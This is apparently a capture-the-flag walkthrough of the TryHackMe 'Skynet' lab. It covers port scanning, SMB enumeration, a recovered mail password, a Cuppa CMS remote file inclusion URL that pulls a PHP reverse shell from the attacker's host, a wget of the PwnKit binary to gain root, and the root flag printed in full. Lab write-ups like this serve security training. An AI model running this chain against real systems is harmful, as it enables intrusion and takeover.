# Skynethttp://10.10.129.107

> https://tryhackme.com/room/skynet 

> ip = 10.10.129.107 

------------------------------------------------

_nmap result_

```bash
astute@astute:~/thm/skynet$ nmap -sC -sV -A 10.10.129.107
Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-14 11:02 IST
Nmap scan report for 10.10.129.107
Host is up (0.24s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP UIDL SASL PIPELINING AUTH-RESP-CODE CAPA RESP-CODES
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: ENABLE capabilities LOGINDISABLEDA0001 more post-login have OK IMAP4rev1 SASL-IR listed IDLE LITERAL+ ID Pre-login LOGIN-REFERRALS
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m01s, deviation: 3h27m50s, median: 1s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-02-13T23:34:00-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-02-14T05:34:01
|_  start_date: N/A

```
_smbclient list_

```bash

astute@astute:~/thm/skynet$ smbclient -L //10.10.129.107/
Enter WORKGROUP\astute's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
```

_content of the anonymous user in smb_

```bash

astute@astute:~/thm/skynet$ smbclient //10.10.129.107/anonymous
Enter WORKGROUP\astute's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 21:34:00 2020
  ..                                  D        0  Tue Sep 17 12:50:17 2019
  attention.txt                       N      163  Wed Sep 18 08:34:59 2019
  logs                                D        0  Wed Sep 18 10:12:16 2019

		9204224 blocks of size 1024. 5831508 blocks available
smb: \> get attention.txt 
getting file \attention.txt of size 163 as attention.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> get logs
NT_STATUS_FILE_IS_A_DIRECTORY opening remote file \logs
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 10:12:16 2019
  ..                                  D        0  Thu Nov 26 21:34:00 2020
  log2.txt                            N        0  Wed Sep 18 10:12:13 2019
  log1.txt                            N      471  Wed Sep 18 10:11:59 2019
  log3.txt                            N        0  Wed Sep 18 10:12:16 2019

		9204224 blocks of size 1024. 5831508 blocks available
smb: \logs\> get log1.txt 
getting file \logs\log1.txt of size 471 as log1.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```

_accesss denied on milesdyson user_

```bash

astute@astute:~/thm/skynet$ smbclient //10.10.129.107/milesdyson
Enter WORKGROUP\astute's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

_gobuster scan_

```bash
astute@astute:~/thm/skynet$ gobuster dir -u http://10.10.129.107/ -w /opt/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.129.107/
[+] Threads:        10
[+] Wordlist:       /opt/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/02/14 11:16:46 Starting gobuster
===============================================================
/admin (Status: 301)
/css (Status: 301)
/js (Status: 301)
/config (Status: 301)
/ai (Status: 301)
/squirrelmail 

```

_login in through brutefor on quirrelmil and got the credentials for milesdyson samba_

```
milesdyson samba creds: )s{A&2Z=F^n_E.B`
 ```

_smb for milesdyson_

```bash

root@astute:/home/astute/thm/skynet# smbclient //10.10.129.107/milesdyson -U milesdyson
Enter WORKGROUP\milesdyson's password: 

Try "help" to get a list of possible commands.
smb: \> 
smb: \> ls
  .                                   D        0  Tue Sep 17 14:35:47 2019
  ..                                  D        0  Wed Sep 18 09:21:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 14:35:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 14:35:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 14:35:14 2019
  notes                               D        0  Tue Sep 17 14:48:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 14:35:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 14:35:14 2019

		9204224 blocks of size 1024. 5829716 blocks available
smb: \> ls
  .                                   D        0  Tue Sep 17 14:35:47 2019
  ..                                  D        0  Wed Sep 18 09:21:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 14:35:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 14:35:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 14:35:14 2019
  notes                               D        0  Tue Sep 17 14:48:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 14:35:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 14:35:14 2019

```

_got some important file on notes directory_


```bash

		9204224 blocks of size 1024. 5829712 blocks available
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 14:48:40 2019
  ..                                  D        0  Tue Sep 17 14:35:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 14:31:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 14:31:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 14:31:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 14:31:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 14:31:29 2019
  important.txt                       N      117  Tue Sep 17 14:48:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 14:31:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 14:31:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 14:31:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 14:31:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 14:31:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 14:31:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 14:31:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 14:31:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 14:31:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 14:31:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 14:31:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 14:31:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 14:31:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 14:31:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 14:31:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 14:31:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 14:31:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 14:31:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 14:31:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 14:31:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 14:31:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 14:31:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 14:31:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 14:31:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 14:31:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 14:31:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 14:31:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 14:31:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 14:31:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 14:31:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 14:31:29 2019

		9204224 blocks of size 1024. 5829712 blocks available
smb: \notes\> get important.txt 
getting file \notes\important.txt of size 117 as important.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```

_content of important file_

```bash 

root@astute:/home/astute/thm/skynet# cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
_gobuster scan from new subdomain_

```bash

astute@astute:~/thm/skynet$ gobuster dir -u http://10.10.129.107/45kra24zxs28v3yd/ -w /opt/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.129.107/45kra24zxs28v3yd/
[+] Threads:        10
[+] Wordlist:       /opt/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2022/02/14 11:52:20 Starting gobuster
===============================================================
/administrator (Status: 301)

```

_deadend from nikto scan_

```bash

stute@astute:~/thm/skynet$ nikto -h http://10.10.129.107/45kra24zxs28v3yd/
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.129.107
+ Target Hostname:    10.10.129.107
+ Target Port:        80
+ Start Time:         2022-02-14 11:55:17 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /45kra24zxs28v3yd/, fields: 0x1a2 0x592cb85331880 
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
```

_got the exploit for that login page_

```bash
astute@astute:~/kali/tools/exploitdb$ ./searchsploit cuppa cms
[i] Found (#1): /home/astute/kali/tools/exploitdb/files_exploits.csv
[i] To remove this message, please edit "/home/astute/kali/tools/exploitdb/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#1): /home/astute/kali/tools/exploitdb/files_shellcodes.csv
[i] To remove this message, please edit "/home/astute/kali/tools/exploitdb/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                    |  Path
------------------------------------------------------------------ ---------------------------------
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion   | php/webapps/25971.txt
------------------------------------------------------------------ ---------------------------------
```

_use the above exploit to get the revershell shell_

```
http://10.10.129.107/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.16.12:8080/php-reverse-shell.php

```

_got a reverse shell and used PwnKit to get the root_

```

www-data@skynet:/tmp$ wget 10.10.180.43:8080/PwnKit
--2022-02-14 01:49:17--  http://10.10.180.43:8080/PwnKit
Connecting to 10.10.180.43:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14688 (14K) [application/octet-stream]
Saving to: 'PwnKit'

PwnKit              100%[===================>]  14.34K  --.-KB/s    in 0.01s   

2022-02-14 01:49:18 (1.05 MB/s) - 'PwnKit' saved [14688/14688]

www-data@skynet:/tmp$ ls
PwnKit
systemd-private-af7dc33583e14f358fe55a069f1f0685-dovecot.service-S4GFu6
systemd-private-af7dc33583e14f358fe55a069f1f0685-systemd-timesyncd.service-JiJv6z
www-data@skynet:/tmp$ chmod +x PwnKit 
www-data@skynet:/tmp$ ./PwnKit 
root@skynet:/tmp# cd /root
root@skynet:~# ls
root.txt
root@skynet:~# cat root.txt 
3f0372db24753accc7179a282cd6a949
root@skynet:~# 

```

**Thank You**

